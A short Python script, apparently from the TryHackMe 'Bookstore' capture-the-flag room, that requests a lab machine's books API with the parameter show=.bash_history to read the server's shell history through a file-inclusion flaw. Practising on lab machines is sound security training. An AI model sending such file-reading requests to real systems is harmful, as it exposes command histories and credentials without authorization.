import requests
import sys


#10.10.105.83
# this was try hackme bookstore room
# for word in sys.stdin:
response = requests.get(url=f"http://10.10.105.83:5000/api/v1/resources/books?show=.bash_history")
print(response)
